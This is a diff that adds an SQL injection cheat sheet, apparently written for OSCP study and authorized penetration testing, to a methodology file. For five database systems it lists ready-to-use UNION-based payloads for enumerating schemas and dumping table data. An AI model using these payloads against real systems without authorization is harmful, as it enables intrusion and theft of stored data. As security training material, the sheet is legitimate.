@@ -1,5 +1,332 @@
 # SQLi Methodology
 
+# SQL Injection Cheat Sheet
+
+Complete SQL injection payloads for authorized penetration testing across all major database systems.
+
+---
+
+## MySQL/MariaDB
+
+### 1. Error-Based Tests
+```sql
+' OR 1=1-- -
+' AND 1=2 UNION SELECT NULL-- -
+```
+
+### 2. Sort Columns (Find Maximum Column Count)
+```sql
+' ORDER BY 1-- -
+' ORDER BY 2-- -
+' ORDER BY 3-- -
+```
+*Continue incrementing until error occurs*
+
+**Alternative: UNION Method**
+```sql
+' UNION SELECT NULL-- -
+' UNION SELECT NULL,NULL-- -
+' UNION SELECT NULL,NULL,NULL-- -
+```
+
+### 3. Find Version
+```sql
+' UNION SELECT NULL,@@version-- -
+' UNION SELECT NULL,version()-- -
+```
+
+### 4. Find Database Name
+```sql
+' UNION SELECT NULL,database()-- -
+```
+
+### 5. Find Current User
+```sql
+' UNION SELECT NULL,user()-- -
+' UNION SELECT NULL,current_user()-- -
+```
+
+### 6. Find Databases
+```sql
+' UNION SELECT NULL,schema_name FROM information_schema.schemata-- -
+```
+
+### 7. Find Tables from Database
+```sql
+' UNION SELECT NULL,table_name FROM information_schema.tables WHERE table_schema='database_name'-- -
+```
+
+### 8. Find Columns from Table
+```sql
+' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='table_name'-- -
+```
+
+### 9. Dump Data
+```sql
+' UNION SELECT NULL,CONCAT(column1,':',column2) FROM database_name.table_name-- -
+```
+
+---
+
+## PostgreSQL
+
+### 1. Error-Based Tests
+```sql
+' OR 1=1-- -
+' AND 1=CAST(1 AS int)-- -
+```
+
+### 2. Sort Columns (Find Maximum Column Count)
+```sql
+' ORDER BY 1-- -
+' ORDER BY 2-- -
+' ORDER BY 3-- -
+```
+*Continue incrementing until error occurs*
+
+### 3. Find Version
+```sql
+' UNION SELECT NULL,version()-- -
+```
+
+### 4. Find Database Name
+```sql
+' UNION SELECT NULL,current_database()-- -
+```
+
+### 5. Find Current User
+```sql
+' UNION SELECT NULL,current_user-- -
+' UNION SELECT NULL,session_user-- -
+```
+
+### 6. Find Databases
+```sql
+' UNION SELECT NULL,datname FROM pg_database-- -
+```
+
+### 7. Find Tables from Database
+```sql
+' UNION SELECT NULL,tablename FROM pg_tables WHERE schemaname='public'-- -
+```
+
+### 8. Find Columns from Table
+```sql
+' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='table_name'-- -
+```
+
+### 9. Dump Data
+```sql
+' UNION SELECT NULL,column1||':'||column2 FROM table_name-- -
+```
+
+---
+
+## Microsoft SQL Server (MSSQL)
+
+### 1. Error-Based Tests
+```sql
+' OR 1=1-- -
+' AND 1=CONVERT(int,1)-- -
+```
+
+### 2. Sort Columns (Find Maximum Column Count)
+```sql
+' ORDER BY 1-- -
+' ORDER BY 2-- -
+' ORDER BY 3-- -
+```
+*Continue incrementing until error occurs*
+
+### 3. Find Version
+```sql
+' UNION SELECT NULL,@@version-- -
+```
+
+### 4. Find Database Name
+```sql
+' UNION SELECT NULL,DB_NAME()-- -
+```
+
+### 5. Find Current User
+```sql
+' UNION SELECT NULL,SYSTEM_USER-- -
+' UNION SELECT NULL,USER_NAME()-- -
+```
+
+### 6. Find Databases
+```sql
+' UNION SELECT NULL,name FROM master..sysdatabases-- -
+' UNION SELECT NULL,name FROM sys.databases-- -
+```
+
+### 7. Find Tables from Database
+```sql
+' UNION SELECT NULL,name FROM database_name..sysobjects WHERE xtype='U'-- -
+' UNION SELECT NULL,table_name FROM database_name.information_schema.tables-- -
+```
+
+### 8. Find Columns from Table
+```sql
+' UNION SELECT NULL,column_name FROM database_name.information_schema.columns WHERE table_name='table_name'-- -
+```
+
+### 9. Dump Data
+```sql
+' UNION SELECT NULL,column1+':'+column2 FROM database_name..table_name-- -
+```
+
+---
+
+## Oracle
+
+### 1. Error-Based Tests
+```sql
+' OR 1=1-- -
+' AND 1=1-- -
+```
+
+### 2. Sort Columns (Find Maximum Column Count)
+```sql
+' ORDER BY 1-- -
+' ORDER BY 2-- -
+' ORDER BY 3-- -
+```
+*Continue incrementing until error occurs*
+
+*Note: Oracle requires FROM dual or valid table*
+
+### 3. Find Version
+```sql
+' UNION SELECT NULL,banner FROM v$version-- -
+```
+
+### 4. Find Database Name
+```sql
+' UNION SELECT NULL,instance_name FROM v$instance-- -
+' UNION SELECT NULL,global_name FROM global_name-- -
+```
+*Note: Oracle uses SID instead of traditional database names*
+
+### 5. Find Current User
+```sql
+' UNION SELECT NULL,USER FROM dual-- -
+```
+
+### 6. Find Databases/Schemas
+```sql
+' UNION SELECT NULL,username FROM all_users-- -
+```
+
+### 7. Find Tables from Schema
+```sql
+' UNION SELECT NULL,table_name FROM all_tables WHERE owner='SCHEMA_NAME'-- -
+```
+
+### 8. Find Columns from Table
+```sql
+' UNION SELECT NULL,column_name FROM all_tab_columns WHERE table_name='TABLE_NAME'-- -
+```
+
+### 9. Dump Data
+```sql
+' UNION SELECT NULL,column1||':'||column2 FROM table_name-- -
+```
+
+---
+
+## SQLite
+
+### 1. Error-Based Tests
+```sql
+' OR 1=1-- -
+```
+
+### 2. Sort Columns (Find Maximum Column Count)
+```sql
+' ORDER BY 1-- -
+' ORDER BY 2-- -
+' ORDER BY 3-- -
+```
+*Continue incrementing until error occurs*
+
+### 3. Find Version
+```sql
+' UNION SELECT NULL,sqlite_version()-- -
+```
+
+### 4. Find Database Name
+*N/A - SQLite uses file-based databases (single database per file)*
+
+### 5. Find Current User
+*N/A - SQLite has no user authentication concept*
+
+### 6. Find Databases
+*N/A - SQLite uses single database model*
+
+### 7. Find Tables
+```sql
+' UNION SELECT NULL,name FROM sqlite_master WHERE type='table'-- -
+```
+
+### 8. Find Columns from Table
+```sql
+' UNION SELECT NULL,sql FROM sqlite_master WHERE type='table' AND name='table_name'-- -
+```
+
+### 9. Dump Data
+```sql
+' UNION SELECT NULL,column1||':'||column2 FROM table_name-- -
+```
+
+---
+
+## Quick Reference Guide
+
+### Comment Styles by Database
+| Database | Comment Syntax |
+|----------|----------------|
+| MySQL | `-- -`, `#`, `/* */` |
+| PostgreSQL | `--`, `/* */` |
+| MSSQL | `--`, `/* */` |
+| Oracle | `--`, `/* */` |
+| SQLite | `--`, `/* */` |
+
+### String Concatenation by Database
+| Database | Concatenation Operator |
+|----------|------------------------|
+| MySQL | `CONCAT()` or `||` |
+| PostgreSQL | `||` |
+| MSSQL | `+` |
+| Oracle | `||` |
+| SQLite | `||` |
+
+---
+
+## Important Notes
+
+⚠️ **Authorization Required**: These payloads are for authorized penetration testing only in controlled environments like OSCP labs.
+
+🔍 **NULL Matching**: When using UNION attacks, you must match the exact number of columns in the original query. Use NULL placeholders and replace them one at a time to extract data.
+
+📝 **Testing Workflow**:
+1. Test for SQL injection vulnerability
+2. Determine number of columns
+3. Identify database type and version
+4. Enumerate database structure
+5. Extract sensitive data
+
+🎯 **OSCP Tips**:
+- Always document your findings
+- Try multiple injection points (GET, POST, cookies, headers)
+- Consider time-based and boolean-based blind injections if UNION doesn't work
+- Use SQLmap when manual exploitation is time-consuming
+
+---
+
+*Last Updated: November 2025*
+*For authorized security testing only*
+
 ### 1) Confirmation of a potential SQLi
 
     ' or 1=1 -- -
